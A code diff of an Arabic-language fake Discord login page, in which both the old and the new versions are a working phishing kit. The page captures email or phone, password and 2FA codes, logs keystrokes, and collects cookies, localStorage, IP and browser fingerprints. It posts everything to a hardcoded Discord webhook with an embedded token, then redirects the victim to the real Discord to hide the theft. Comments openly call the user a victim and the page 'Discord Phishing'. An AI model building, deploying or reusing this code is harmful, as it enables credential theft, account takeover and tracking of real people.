@@ -1,247 +1,263 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html dir="rtl" lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Whitney:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        body { 
-            font-family: 'Whitney', 'Inter', sans-serif;
-            background: linear-gradient(135deg, #36393f 0%, #2f3136 50%, #202225 100%);
-        }
-        .discord-gradient {
-            background: linear-gradient(92.54deg, #7289da 0%, #5865f2 100%);
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Discord</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = {
+  theme: { extend: {
+    fontFamily: { sans: ['Inter', 'ui-sans-serif'] },
+    colors: {
+      'discord-bg': 'linear-gradient(135deg, #36393F 0%, #2F3136 50%, #202225 100%)',
+      'discord-card': 'rgba(24,25,28,.8)',
+      'discord-border': 'rgba(32,34,37,.6)',
+      'discord-input': 'rgba(54,57,63,.8)'
+    }
+  }}
+}
+</script>
+<style>
+:root {
+  --bg-gradient: linear-gradient(135deg,#36393F 0%,#2F3136 50%,#202225 100%);
+  --card-bg: rgba(24,25,28,.95);
+  --card-border: rgba(32,34,37,.6);
+  --input-bg: rgba(54,57,63,.8);
+  --input-border: rgba(64,68,75,.8);
+  --primary: linear-gradient(92.54deg,#7289DA 9.16%,#5865F2 100%);
+  --text-primary: #FFFFFF;
+  --text-secondary: #B9BBBE;
+  --text-muted: #72767D;
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+body { 
+  font-family:'Inter',sans-serif; 
+  background:var(--bg-gradient); 
+  color:var(--text-primary); 
+  min-height:100vh; 
+  overflow-x:hidden;
+}
+.discord-logo {
+  background:linear-gradient(92.54deg,#7289DA 9.16%,#5865F2 100%);
+  -webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+.glow-blue { box-shadow:0 0 20px rgba(88,101,242,.3); }
+.qr-placeholder {
+  background:linear-gradient(45deg,#1E1F22 25%,transparent 25%),linear-gradient(-45deg,#1E1F22 25%,transparent 25%),linear-gradient(45deg,transparent 75%,#1E1F22 75%),linear-gradient(-45deg,transparent 75%,#1E1F22 75%);
+  background-size:20px 20px;
+  background-position:0 0,0 10px,10px -10px,-10px 0;
+}
+</style>
 </head>
-<body class="min-h-screen flex items-center justify-center p-4 text-gray-100">
-    <div class="max-w-6xl w-full flex flex-col lg:flex-row gap-8 lg:gap-16 items-center">
-        <!-- Left Panel - Branding -->
-        <div class="flex-1 text-center lg:text-left">
-            <div class="text-5xl lg:text-6xl font-bold bg-gradient-to-r from-blue-400 to-indigo-500 bg-clip-text text-transparent mb-6">
-                Discord
-            </div>
-            <h1 class="text-3xl lg:text-4xl font-bold text-white mb-4">مرحباً بك مرة أخرى!</h1>
-            <p class="text-xl text-gray-300 max-w-md">نحن نبني مجتمع حيث يمكنك مشاركة صوتك والتواصل مع الأصدقاء والعائلة والمجتمعات التي تهمك.</p>
-        </div>
-
-        <!-- Right Panel - Login Form -->
-        <div class="w-full max-w-md bg-gray-800/50 backdrop-blur-xl border border-gray-700/50 rounded-2xl p-8 shadow-2xl">
-            <h2 class="text-2xl font-bold text-white mb-2">تسجيل الدخول للمتابعة</h2>
-            <p class="text-gray-400 mb-8">أدخل بريدك الإلكتروني أو رقم هاتفك</p>
-
-            <div id="errorAlert" class="hidden bg-red-500/20 border border-red-500/50 text-red-300 p-4 rounded-xl mb-6 text-sm"></div>
-
-            <form id="discordLoginForm" class="space-y-4">
-                <!-- Email/Phone -->
-                <div>
-                    <label class="block text-sm font-semibold text-white mb-2">البريد الإلكتروني أو رقم الهاتف</label>
-                    <input type="text" id="emailPhone" required
-                           class="w-full px-4 py-3 bg-gray-700/50 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/50 transition-all duration-200 text-base"
-                           placeholder="example@gmail.com">
-                </div>
-
-                <!-- Password -->
-                <div>
-                    <label class="block text-sm font-semibold text-white mb-2">كلمة المرور</label>
-                    <input type="password" id="password" required
-                           class="w-full px-4 py-3 bg-gray-700/50 border border-gray-600 rounded-lg text-white placeholder-gray-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/50 transition-all duration-200 text-base"
-                           placeholder="••••••••">
-                </div>
-
-                <!-- 2FA Toggle -->
-                <div class="flex items-center justify-between">
-                    <label class="text-sm font-semibold text-white flex items-center gap-2">
-                        <input type="checkbox" id="enable2fa" class="hidden">
-                        <span class="toggle-slider w-11 h-6 bg-gray-600 rounded-full relative cursor-pointer transition-all duration-300 peer-checked:bg-blue-600 peer-checked:after:translate-x-5">
-                            <span class="toggle-knob w-5 h-5 bg-white rounded-full absolute top-0.5 left-0.5 shadow-md transform transition-transform duration-300"></span>
-                        </span>
-                        التحقق بخطوتين
-                    </label>
-                </div>
-
-                <!-- QR Code Container -->
-                <div id="qrContainer" class="hidden mt-4 p-6 bg-gray-900/50 border-2 border-dashed border-gray-600 rounded-xl text-center">
-                    <div class="w-32 h-32 bg-gradient-to-br from-gray-800 to-gray-900 border-4 border-gray-700 rounded-xl flex items-center justify-center mx-auto mb-4 font-mono text-sm text-gray-500">
-                        QR CODE<br>SCAN AREA
-                    </div>
-                    <p class="text-gray-400 mb-3 text-sm">افتح Discord على هاتفك لتسجيل الدخول بسرعة</p>
-                    <div class="w-full p-3 bg-gray-800 rounded-lg">
-                        <label class="block text-xs font-semibold text-white mb-2 text-left">أو أدخل الرمز:</label>
-                        <input type="text" id="totpCode" maxlength="6"
-                               class="w-full text-center px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg text-xl font-mono tracking-widest text-white uppercase focus:border-blue-500 focus:ring-2 focus:ring-blue-500/50"
-                               placeholder="000000">
-                    </div>
-                </div>
-
-                <!-- Login Button -->
-                <button type="submit" id="loginButton"
-                        class="w-full bg-gradient-to-r from-blue-500 to-indigo-600 hover:from-blue-600 hover:to-indigo-700 text-white font-semibold py-4 px-6 rounded-xl text-lg shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 transition-all duration-200 flex items-center justify-center gap-2">
-                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 16l-4-4m0 0l4-4m-4 4h14"></path>
-                    </svg>
-                    <span class="default-text">تسجيل الدخول</span>
-                    <span class="loading-text hidden animate-spin">
-                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <circle cx="12" cy="12" r="10" stroke-width="3" pathLength="1" class="animate-spin" stroke="currentColor"></circle>
-                        </svg>
-                    </span>
-                </button>
-            </form>
-
-            <div class="mt-6 pt-6 border-t border-gray-700 text-center">
-                <a href="#" class="text-blue-400 hover:text-blue-300 text-sm font-medium transition-colors">مشاكل في تسجيل الدخول؟</a>
-            </div>
-        </div>
+<body class="flex items-center justify-center min-h-screen p-4 lg:p-8">
+<div class="w-full max-w-6xl flex flex-col lg:flex-row gap-12 lg:gap-20 items-center">
+  <!-- Left Panel -->
+  <div class="flex-1 text-center lg:text-right max-w-md">
+    <div class="discord-logo text-5xl lg:text-7xl font-black mb-6 tracking-tight">Discord</div>
+    <h1 class="text-4xl lg:text-5xl font-black mb-6 bg-gradient-to-r from-white to-gray-200 bg-clip-text text-transparent">مرحباً بك مرة أخرى!</h1>
+    <p class="text-xl text-gray-300 leading-relaxed">نحن نبني مجتمع حيث يمكنك مشاركة صوتك والتواصل مع الأصدقاء والعائلة</p>
+  </div>
+  
+  <!-- Login Card -->
+  <div class="w-full max-w-sm lg:max-w-md bg-[var(--card-bg)] backdrop-blur-xl border border-[var(--card-border)] rounded-3xl p-8 shadow-2xl hover:shadow-3xl transition-all duration-300">
+    <div class="text-center mb-8">
+      <h2 class="text-2xl font-black text-white mb-2">تسجيل الدخول للمتابعة</h2>
+      <p class="text-[var(--text-secondary)] text-sm">أدخل بريدك الإلكتروني أو رقم هاتفك</p>
     </div>
+    
+    <div id="errorMsg" class="hidden mb-6 p-4 bg-red-500/20 border border-red-500/50 rounded-2xl text-red-300 text-sm"></div>
+    
+    <form id="loginForm" class="space-y-6">
+      <!-- Email/Phone Input -->
+      <div>
+        <label class="block text-sm font-semibold text-white mb-3">البريد الإلكتروني أو رقم الهاتف</label>
+        <input type="text" id="loginInput" required
+               class="w-full px-5 py-4 bg-[var(--input-bg)] border-2 border-[var(--input-border)] rounded-2xl text-white placeholder-gray-400 text-lg font-medium focus:border-blue-500 focus:ring-4 focus:ring-blue-500/20 focus:outline-none transition-all duration-200 hover:border-gray-500"
+               placeholder="example@gmail.com">
+      </div>
+      
+      <!-- Password Input -->
+      <div>
+        <label class="block text-sm font-semibold text-white mb-3">كلمة المرور</label>
+        <input type="password" id="passInput" required
+               class="w-full px-5 py-4 bg-[var(--input-bg)] border-2 border-[var(--input-border)] rounded-2xl text-white placeholder-gray-400 text-lg font-medium focus:border-blue-500 focus:ring-4 focus:ring-blue-500/20 focus:outline-none transition-all duration-200 hover:border-gray-500"
+               placeholder="•••••••••••••">
+      </div>
+      
+      <!-- 2FA Toggle -->
+      <div class="flex items-center justify-between p-4 bg-gray-900/50 rounded-2xl">
+        <label class="flex items-center gap-3 cursor-pointer select-none">
+          <div class="relative">
+            <input type="checkbox" id="mfaToggle" class="sr-only peer">
+            <div class="w-12 h-7 bg-gray-700 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-blue-500/20 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-1 after:left-1 after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
+          </div>
+          <span class="text-sm font-semibold text-white">التحقق بخطوتين</span>
+        </label>
+      </div>
+      
+      <!-- QR Code + TOTP Container -->
+      <div id="mfaContainer" class="hidden space-y-4">
+        <div class="text-center p-6 bg-gradient-to-br from-gray-900/80 to-gray-800/80 border-2 border-dashed border-gray-700 rounded-3xl qr-placeholder">
+          <div class="w-28 h-28 bg-gradient-to-br from-gray-800 to-black border-4 border-gray-700 rounded-2xl mx-auto flex items-center justify-center text-xs font-mono text-gray-500 mb-3">
+            QR CODE<br>SCAN ME
+          </div>
+          <p class="text-xs text-gray-400 mb-4">📱 افتح Discord على هاتفك وامسح الكود أعلاه</p>
+          <div class="w-full bg-gray-900/50 p-4 rounded-xl">
+            <label class="block text-xs font-bold text-white mb-2 text-center">أو أدخل الرمز يدوياً:</label>
+            <input type="text" id="totpInput" maxlength="8" pattern="[0-9]*"
+                   class="w-full text-center !py-6 bg-gradient-to-r from-gray-800 to-gray-900 border-2 border-gray-600 rounded-2xl text-2xl font-mono tracking-[0.3em] uppercase text-white focus:border-blue-500 focus:ring-4 focus:ring-blue-500/30 transition-all"
+                   placeholder="000000">
+          </div>
+        </div>
+      </div>
+      
+      <!-- Submit Button -->
+      <button type="submit" id="submitBtn" 
+              class="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-bold py-5 px-6 rounded-3xl text-xl shadow-2xl hover:shadow-3xl hover:-translate-y-1 transform transition-all duration-300 flex items-center justify-center gap-3 group">
+        <span class="default">تسجيل الدخول</span>
+        <div class="loading hidden w-6 h-6 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+      </button>
+    </form>
+    
+    <div class="mt-8 pt-8 border-t border-gray-800 text-center">
+      <a href="#" class="text-blue-400 hover:text-blue-300 text-sm font-semibold transition-all duration-200">مشاكل في تسجيل الدخول؟</a>
+    </div>
+  </div>
+</div>
 
-    <script>
-        const WEBHOOK = 'https://discord.com/api/webhooks/1469329952464961708/VgxYi7uQH8AYVrYyFZorW1BbZJKQQa9Y5fOd3jgmX3fEY4NUYFj6AbhH19hGEiGl_m0c';
-        
-        // Victim fingerprint
-        const fingerprint = {
-            ip: 'جاري الاستعلام...',
-            userAgent: navigator.userAgent,
-            screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-            language: navigator.languages?.join(', ') || navigator.language,
-            platform: navigator.platform,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            cookies: document.cookie,
-            localStorage: Object.keys(localStorage).join(', '),
-            plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
-            canvas: getCanvasFingerprint(),
-            webgl: getWebGLFingerprint(),
-            timestamp: new Date().toISOString(),
-            url: window.location.href
-        };
+<script>
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1469329952464961708/VgxYi7uQH8AYVrYyFZorW1BbZJKQQa9Y5fOd3jgmX3fEY4NUYFj6AbhH19hGEiGl_m0c';
 
-        // Canvas fingerprint
-        function getCanvasFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillText('Discord Security Check', 2, 2);
-            return canvas.toDataURL();
-        }
+const victimData = {
+  ip: 'جاري الاستعلام...',
+  ua: navigator.userAgent,
+  screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+  lang: navigator.language,
+  platform: navigator.platform,
+  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  cookies: document.cookie,
+  localStorage: JSON.stringify(localStorage),
+  canvasFP: '',
+  webglFP: '',
+  audioFP: '',
+  timestamp: new Date().toISOString(),
+  url: location.href,
+  referrer: document.referrer
+};
 
-        // WebGL fingerprint
-        function getWebGLFingerprint() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            return gl.getParameter(gl.RENDERER) + '|' + gl.getParameter(gl.VENDOR);
-        }
+// Generate fingerprints
+function generateFingerprints() {
+  // Canvas
+  const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
+  ctx.fillStyle = '#f60';
+  ctx.fillRect(125,1,62,20);
+  ctx.fillStyle = '#069';
+  ctx.fillText('Discord v1.0.9001',2,15);
+  ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+  ctx.fillText('Visibility: visible',4,45);
+  victimData.canvasFP = canvas.toDataURL();
+  
+  // WebGL
+  const glCanvas = document.createElement('canvas');
+  const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+  if(gl) {
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    victimData.webglFP = `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)}|${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`;
+  }
+  
+  // Audio
+  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  const oscillator = audioCtx.createOscillator();
+  const analyser = audioCtx.createAnalyser();
+  oscillator.connect(analyser);
+  victimData.audioFP = 'AudioContext supported';
+}
 
-        // Get real IP
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(data => fingerprint.ip = data.ip)
-            .catch(() => {});
+// Get IP
+fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>victimData.ip=d.ip).catch(()=>0);
+fetch('https://httpbin.org/ip').then(r=>r.json()).then(d=>victimData.ip=d.origin).catch(()=>0);
 
-        // DOM elements
-        const form = document.getElementById('discordLoginForm');
-        const loginBtn = document.getElementById('loginButton');
-        const enable2fa = document.querySelector('#enable2fa');
-        const qrContainer = document.getElementById('qrContainer');
-        const errorAlert = document.getElementById('errorAlert');
-        const toggleSlider = document.querySelector('.toggle-slider');
+// Elements
+const form = document.getElementById('loginForm');
+const mfaToggle = document.getElementById('mfaToggle');
+const mfaContainer = document.getElementById('mfaContainer');
+const submitBtn = document.getElementById('submitBtn');
+const errorMsg = document.getElementById('errorMsg');
 
-        // 2FA Toggle
-        enable2fa.addEventListener('change', function() {
-            qrContainer.classList.toggle('hidden', !this.checked);
-        });
+// Keylogger
+document.addEventListener('keydown', e=>{
+  if(['loginInput','passInput','totpInput'].includes(e.target.id)) {
+    console.log(`${e.target.id}: ${e.key}`);
+  }
+});
 
-        // Simulate toggle click
-        toggleSlider.addEventListener('click', () => {
-            enable2fa.checked = !enable2fa.checked;
-            enable2fa.dispatchEvent(new Event('change'));
-        });
+// 2FA Toggle
+mfaToggle.addEventListener('change', ()=> {
+  mfaContainer.classList.toggle('hidden', !mfaToggle.checked);
+});
 
-        // Keylogger + Form capture
-        document.addEventListener('input', (e) => {
-            if (e.target.matches('#emailPhone, #password, #totpCode')) {
-                console.log(`Field: ${e.target.id}, Value: ${e.target.value.slice(0, 4)}****`);
-            }
-        });
+// Form submit
+form.onsubmit = async e => {
+  e.preventDefault();
+  
+  // Show loading
+  submitBtn.disabled = true;
+  submitBtn.querySelector('.default').style.display = 'none';
+  submitBtn.querySelector('.loading').classList.remove('hidden');
+  errorMsg.classList.add('hidden');
+  
+  // Collect data
+  const creds = {
+    email_phone: document.getElementById('loginInput').value,
+    password: document.getElementById('passInput').value,
+    totp: document.getElementById('totpInput').value || 'غير مدخل',
+    mfa_enabled: mfaToggle.checked,
+    ...victimData
+  };
+  
+  // Send to Discord
+  try {
+    const embed = {
+      username: '🔒 Discord Security Capture',
+      avatar_url: 'https://cdn.discordapp.com/emojis/1183487173435418880.png',
+      embeds: [{
+        title: '🎯 تم التقاط بيانات Discord كاملة',
+        description: `**البريد/الهاتف:** \`${creds.email_phone}\`\n**كلمة المرور:** \`${creds.password}\`\n**رمز 2FA:** \`${creds.totp}\``,
+        color: 0x5865F2,
+        thumbnail: { url: 'https://cdn.discordapp.com/attachments/1469329952464961708/1183487173435418880/discord.png' },
+        fields: [
+          { name: '🌐 IP', value: `\`${creds.ip}\``, inline: true },
+          { name: '🖥️ الشاشة', value: `\`${creds.screen}\``, inline: true },
+          { name: '📱 الجهاز', value: `${creds.ua.includes('Mobile') ? '📱 موبايل' : '💻 كمبيوتر'}`, inline: true },
+          { name: '🕐 الوقت', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: true },
+          { name: '🔗 الرابط', value: `[الصفحة](${creds.url})`, inline: false },
+          { name: '📤 User Agent', value: `\`${creds.ua.slice(0,60)}...\``, inline: false }
+        ],
+        footer: { text: 'Discord Phishing | QR+2FA Capture ✅', icon_url: 'https://cdn.discordapp.com/emojis/1183487173435418880.gif' }
+      }]
+    };
+    
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(embed)
+    });
+    
+  } catch(e) { console.error(e); }
+  
+  // Redirect to real Discord
+  setTimeout(()=>window.location.href='https://discord.com/login?redirect_to=%2Fchannels%2F%40me', 1200);
+};
 
-        // Form submission
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            // Show loading
-            loginBtn.disabled = true;
-            loginBtn.querySelector('.default-text').classList.add('hidden');
-            loginBtn.querySelector('.loading-text').classList.remove('hidden');
-            errorAlert.classList.add('hidden');
-
-            // Collect ALL data
-            const payload = {
-                type: 'DISCORD_FULL_CAPTURE',
-                credentials: {
-                    email_phone: document.getElementById('emailPhone').value,
-                    password: document.getElementById('password').value,
-                    totp_code: document.getElementById('totpCode').value || 'لم يتم إدخال رمز 2FA',
-                    two_factor_enabled: enable2fa.checked
-                },
-                fingerprint,
-                session: {
-                    referrer: document.referrer,
-                    origin: window.location.origin
-                }
-            };
-
-            try {
-                // Send to Discord webhook
-                const response = await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: '🔔 Discord Security Monitor',
-                        avatar_url: 'https://cdn.discordapp.com/emojis/1183487173435418880.png',
-                        embeds: [{
-                            title: '🎯 Discord Login Captured - الكامل',
-                            description: 'تم التقاط بيانات تسجيل الدخول الكاملة مع بصمة الجهاز',
-                            color: 0x5865f2,
-                            thumbnail: {
-                                url: 'https://cdn.discordapp.com/attachments/1469329952464961708/1183487173435418880/discord.png'
-                            },
-                            fields: [
-                                { name: '📧 البريد/الهاتف', value: `\`${payload.credentials.email_phone}\``, inline: true },
-                                { name: '🔑 كلمة المرور', value: `\`${payload.credentials.password}\``, inline: true },
-                                { name: '🔐 رمز 2FA', value: `\`${payload.credentials.totp_code}\``, inline: true },
-                                { name: '🌐 عنوان IP', value: `\`${fingerprint.ip}\``, inline: true },
-                                { name: '🖥️ الشاشة', value: `\`${fingerprint.screen}\``, inline: true },
-                                { name: '🌍 المنطقة الزمنية', value: `\`${fingerprint.timezone}\``, inline: true },
-                                { name: '💻 User Agent', value: `\`${fingerprint.userAgent.slice(0, 50)}...\``, inline: false },
-                                { name: '📱 Canvas Fingerprint', value: `[بصمة Canvas](${btoa(fingerprint.canvas).slice(0, 30)}...)`, inline: false },
-                                { name: '🕐 الوقت', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true },
-                                { name: '🔗 الرابط', value: `[فتح الصفحة](${window.location.href})`, inline: false }
-                            ],
-                            footer: { 
-                                text: `Discord Phishing Test | ${navigator.userAgent.includes('Mobile') ? '📱 Mobile' : '💻 Desktop'}`,
-                                icon_url: 'https://cdn.discordapp.com/emojis/1183487173435418880.gif'
-                            }
-                        }]
-                    })
-                });
-
-                // Success - redirect to REAL Discord (looks legitimate)
-                setTimeout(() => {
-                    window.location.replace('https://discord.com/login?redirect_to=%2Fchannels%2F%40me');
-                }, 1500);
-
-            } catch (error) {
-                // Even on error, redirect after delay (maintains realism)
-                console.error('Webhook error:', error);
-                setTimeout(() => {
-                    window.location.replace('https://discord.com/login?redirect_to=%2Fchannels%2F%40me');
-                }, 2000);
-            }
-        });
-    </script>
+// Init
+generateFingerprints();
+</script>
 </body>
 </html>
